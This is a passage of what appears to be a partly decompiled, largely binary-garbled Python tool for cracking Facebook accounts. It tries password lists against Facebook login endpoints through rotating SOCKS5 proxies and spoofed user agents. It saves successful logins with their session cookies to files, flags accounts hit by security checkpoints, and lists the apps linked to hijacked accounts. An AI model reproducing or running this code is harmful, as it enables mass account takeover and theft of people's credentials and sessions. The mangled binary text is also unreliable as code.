denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdrr'  r   r(  aS  https://m.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=1862952583919182&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_r*  r+  r/  c                 S   r0  r1  rL   r2  rL   rL   rM   r6  �  r7  zcrackfree.<locals>.<listcomp>r8  r   r�   r9  r:  r!  r;  r<  r�   r�   r=  r�   r>  r�   r�   r?  r@  r"  r#  r$  r�   rA  rB  r�   r)  c                 S   r0  r1  rL   r2  rL   rL   rM   r6  �  r7  r%  r&  zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0rx   FrC  rE  r�   rG  r�   zplay-audio .cp.mp3r�   rJ   r<   rH  rF  c                 S   r0  r1  rL   r2  rL   rL   rM   r6  �  r7  rI  zplay-audio .ok.mp3r�   r�   )7r^   r_   rH   rN  r+   rm   r�   rJ  r�   r|   r#   r  ro   r  rr   rn   rK  rL  r`   r�   r�   rB   r�   r�   r�   rC   rE   r�   rG   rD   r�   rz   rO  rP  rQ  rY  rR  r   r&   r)   rg   �popenr=   r  rS  rA   r�   r�   r  rT  rU  r�   r�   ra   rb   )r  r  r�   rI   rV  r�   rW  rZ  r[  r\  r]  r^  r_  rL   rL   rM   r  �  sR   �



"
:j:r
 
$
 
�r  c           !      C   s�  t �ttttttg�}td t	t
� }d}t �t�}dd| i}t �t�}t �t�}t�� }	tj�d|tt	t
�ttt|�t|�tf � tj��  |D �](}
�z|	j�dddd	|d
ddddd�
� |	�d�}t�dt|j���d�t�dt|j���d�| dd|
d�}d� dd� |j!�"� �#� D ��}|d7 }i dd�dd�dd�dd�d d!�d"d	�d#d$�d%d&�d'|�d(d
�d)d*�d+d�d,d�d-d�d.d�d/d0�d1d2�d3d4i�}|	j$d5|d6|i|d7|d8�}d9|j!�"� �%� v �r<d:t&v r�t'�(| d; |
 � t)| |
� n?d:t*v �r6t+d<� d=| � d>|
� �}t,|d?d@�}t-t,|dAdB�� t.dCt/ dD��| d; |
 d< � t'�(| d; |
 � td7 anW qKW  �n9dE|	j!�"� �%� v �r`d'dFi}dGt0v �r�|j!�"� }d� dHd� |	j!�"� �#� D ��}t.dIt1 dD��| d; |
 d; | d< � t+d<� d=| � dJ|
� dK|� �}t,|dLd@�}t-t,|dMdB�� td7 aW  n�d:t0v �r_|j!�"� }d� dNd� |	j!�"� �#� D ��}t.dIt1 dD��| d; |
 d; | d< � | }dO}t�� }|jdP||dQ�j}|jdR||dQ�j}|dS7 }t�2dTt|��}d}|D ]}|dU|� dV|dW � dX|d � dY�7 }|d7 }�q�dW}|dZ7 }t�2dTt|��} dW}| D ]}|d7 }|d[|� dV|dW � dX|d � d\�7 }�qt+d<� d]| � dJ|
� dK|� d^|� �}t,|dLd@�}t-t,|d_dB�� td7 aW  nnW qKW qK tj3j4�yt   t5�6d`� Y qKw td7 ad S )aNr   �%r  �	socks5://�0   %s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬zfree.facebook.comr�   r  rO   r  r  r  r  r�   r  a�  https://free.facebook.com/?subno_key=AaGkjXofx5D5zQPxcBazNU2pl_Fn8aoa13urrsZ942x4lho213X4bo7rSmIiMVRupRgG0yzmXf-v9bB-XsIRtYHSLl1990ogdaRBVF7e14vzC5n8oWQ1V204CQkSQjp0YS2fOc5ea887G31hp0-zQUnDMnH73mohdfa9nLDC6tfQ-FXDiEN9dW3JnHozM8jc_CYKSr1OTuo46I8ktHqWAB9CIfXjCkuuuTGnC3uPuhf3D8HOUwSqGFZVTWKlQXRJgdXEgQOj5ttEFYdGNbdQ8GA1AnZ0-iegEiRA8uiSXZL3YkdxSbfBavzfbyQfwAIiTK0&hrc=1&refsrc=deprecated&_rdrr'  r   r(  z,https://free.facebook.com/login/save-device/r*  r+  r/  c                 S   r0  r1  rL   r2  rL   rL   rM   r6  
  r7  zcracktouch.<locals>.<listcomp>r8  r   r�   r9  r:  r!  r;  r<  r�   r�   zhttps://free.facebook.comr�   r>  r�   r�   r?  r@  r"  r#  r$  r�   rA  rB  r�   �#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7�
connection�closezFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0rx   FrC  rE  r�   r�   r<   �   [•] ID       : �    [•] PASSWORD : r}   r~   �AOREC-XD CP�r�   �/sdcard/4MBF-DATA/CP/rJ   rH  ��SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�   c                 S   r0  r1  rL   r2  rL   rL   rM   r6     r7  �/sdcard/4MBF-DATA/OK/�   
[•] PASSWORD : �   
[•] COOKIES  : r�   zAOREC-XD OKc                 S   r0  r1  rL   r2  rL   rL   rM   r6  *  r7  r�   �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�rz   r�   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�:   
[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] 
�`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>�[bold cyan][r�   r   r   �[/bold cyan]
�>   
[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]
�[bold yellow][�[/bold yellow]
�   [bold green][•] ID       : �[/bold green]
�$[bold green]AOREC-XD OK[/bold green]r�   �7r�   r�   rc   ro   �kkr�   rp   r�   rJ  r�   r�   rM  r@   �ugen2rB   r�   r^   r_   rH   r  r  r�   rG   rr   r`   r�   r�   rC   rE   r�   rD   r�   rN  rz   rO  rP  rQ  rR  �oprekrS  rA   �ceker�princpr   r�   r�   r=   r  �	taplikasir  rF   r�   r�   ra   rb   �!r  r  �biZpersZfffrX  rY  rI   rV  r�   rW  r�   rZ  r[  r\  r]  ZstatuscpZ	statuscp1Zheadappr^  r_  ZstatusokZ	statusok1�userZinfoakunrU  Zcek2�cekZapkaktifZnokZmunculZhitZapkexprL   rL   rM   r  �  s�   


6
"
:r
 


(

($(� �!�r  c           !      C   s  t �ttttttg�}td t	t
� }d}t �t�}dd| i}t �t�}t �t�}t�� }	tj�d|tt	t
�ttt|�t|�tf � tj��  |D �]1}
�z|	j�dddd	|d
ddddd�
� |	�d|  d �}t�dt|j���d�t�dt|j���d�| dd|
d�}d� dd� |j!�"� �#� D ��}|d7 }i dd�dd�dd�d d�d!d"�d#d	�d$d%�d&d'�d(|�d)d
�d*d+�d,d�d-d�d.d�d/d|  d �d0d1�d2d3�d4d5i�}|	j$d6|d7|i|d8|d9�}d:|j!�"� �%� v �rEd;t&v �rt'�(| d< |
 � t)| |
� n?d;t*v �r?t+d=� d>| � d?|
� �}t,|d@dA�}t-t,|dBdC�� t.dDt/ dE��| d< |
 d= � t'�(| d< |
 � td7 anW qKW  �n9dF|	j!�"� �%� v �rid(dGi}dHt0v �r�|j!�"� }d� dId� |	j!�"� �#� D ��}t.dJt1 dE��| d< |
 d< | d= � t+d=� d>| � dK|
� dL|� �}t,|dMdA�}t-t,|dNdC�� td7 aW  n�d;t0v �rh|j!�"� }d� dOd� |	j!�"� �#� D ��}t.dJt1 dE��| d< |
 d< | d= � | }dP}t�� }|jdQ||dR�j}|jdS||dR�j}|dT7 }t�2dUt|��}d}|D ]}|dV|� dW|dX � dY|d � dZ�7 }|d7 }�q�dX}|d[7 }t�2dUt|��} dX}| D ]}|d7 }|d\|� dW|dX � dY|d � d]�7 }�q't+d=� d^| � dK|
� dL|� d_|� �}t,|dMdA�}t-t,|d`dC�� td7 aW  nnW qKW qK tj3j4�y}   t5�6da� Y qKw td7 ad S )bNr   ra  r  rb  rc  �mbasic.facebook.comr�   r  rO   r  r  r  r  r�   r  z=https://mbasic.facebook.com/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdrr'  r   r(  z.https://mbasic.facebook.com/login/save-device/r*  r+  r/  c                 S   r0  r1  rL   r2  rL   rL   rM   r6  ]  r7  zcrackmbasic.<locals>.<listcomp>r8  r   r�   r9  r:  r!  r;  r<  r�   r�   r�   r�   r>  r�   r�   r?  r@  r"  r#  r$  r�   rA  rB  r�   rd  re  rf  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0rx   FrC  rE  r�   r�   r<   rg  rh  r}   r~   ri  rj  rk  rJ   rH  rl  r�   c                 S   r0  r1  rL   r2  rL   rL   rM   r6  s  r7  rm  rn  ro  r�   r�   c                 S   r0  r1  rL   r2  rL   rL   rM   r6  }  r7  r�   rp  rq  rr  rs  rt  ru  r�   r   r   rv  rw  rx  ry  rz  r{  r|  r�   r}  r�  rL   rL   rM   r  M  s�   


6
":z

 


(

($(���r  c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))Nz�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]r�  r�   rO   r�   r>  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gpr  �navigater  �document�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflater�   �r   r�   r�   r�   r�   r�   r�   r?  r"  r#  zsec-fetch-userr$  r�   rA  r�   �%https://mbasic.facebook.com/login.phpr
  �Zemailr.  ri   T�r�   r�   rD  r�   �form�Znhr,  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datart   r{   r5  �action�r�   r�   �%s++++ %s|%s ----> CP       %sr�   rJ   r�   r<   r   �optionr   �2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   r�   rC   �soprQ  rD   r�   r�   rG   r   r�   rr   r=   r  rH   r  r�   r�   r�   r~  r�   rc   )r  rW  rI   �headr�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�crL   rL   rM   r�  �  s<   $
"
�$ 
� ��r�  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIrj  r�   rl   z] Mulaiz# PROSES CEK OPSI DIMULAIr�   r~   r   r�   r   r�   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr   r�   r�   r�  r�   rO   r�   r>  r�  r�  r  r�  r  r�  r�  r�  r�   r�  r�  r
  r�  Tr�  r�   rE  r�  r�  rt   r{   r5  r�  r�  r�  r�  r�  r�  z#%s---> Tidak Dapat Mengecek Opsi%srH  z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr�   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIr}   z# DONE)(r�   rS  r�   r�   rt   rr   rp   r�   r   r�   r�   �
IndexErrorra   rb   r�   rc   r�   r�   ro   r~  r�   r^   r_   r`   rB   r�   rC   r�  rQ  rD   rz   rO  rR  r�   r�   rG   r�   r�   r�   r�   )r�  r  r�  ZloveZkesr|   rW  r�  rI   r�   �headerr�  r�  r�  r�   r�  r�  r�  r�  r�  r�   ZdahrL   rL   rM   �cek_opsi�  sr   
"
�($
"
�$
�
�
r�  c              	   C   sF  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr5tdt� dt� dt� d�� nt	t|��D ]}tdt
|d || �dd�tf � q;| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr�tdt� dt� dt� d�� d S t	t|��D ]}tdt|d || �dd�tf � q�d S )Nrr  rx   ry   r�   r�  rQ  )r�   c                 S   �   g | ]}|j �qS rL   �rD   �r3  �irL   rL   rM   r6  �  �    zcek_apk.<locals>.<listcomp>Zh3r   z
 r�   �!z-] opshh tidak ada aplikasi aktif di akun ini.z   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padarp  c                 S   r�  rL   r�  r�  rL   rL   rM   r6    r�  z2] opshh tidak ada aplikasi kadaluarsa di akun ini.ZKedaluwarsaz Kedaluwarsa)rC   rD   r   r�   r�   r�   r   r)   r(   r�   r#   r�   r&   )rU  rx   r   r�  rr   Zgamer�  rL   rL   rM   rT  �  s"   
&
 &�rT  �__main__zgit pullr�   r�   r�   ztouch .prox.txt)�rB   Zbs4r�   rg   r^   r�   Zdatetimera   rE   Zurllib3Zrich�base64Z
rich.tabler   �meZrich.consoler   r�   r   r�  Zconcurrent.futuresr   r  r   ZgpZ
rich.panelr   r�   r   r�   Zrich.markdownr	   r�   Zrich.columnsr
   r�   Zrprintr   Z	rich.textr   Ztekz�installZCONr  r@   Zcokbrutr�   r�   r�  rC   rD   rM  r=   rH   r�   rd   r>   r?   r�   ZxdrJ   �	randranger�   r�  �d�fr�   rp   r�  �jro   rN   rA   rK   r�   �lZuaku2rr   Zuakr|   r�   rJ  r  r  rS  r�  r�   Z	lisensikur�  r   r�   Zlisensikunir   r  r+   r(   r#   r&   r   r0   r*   r)   r5   rq   rn   r�   rc   r~  r�   rm   ZdicZdic2ZnowZdayZtglrG   ZmonthZblnZyearZthnr  r  re   rf   rj   rs   ru   ri   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r  r  r  r  r�  r�  rT  �__name__rh   �mkdirrL   rL   rL   rM   �<module>   s  H��<
B>8
(((b/(A)?6+.SQ9
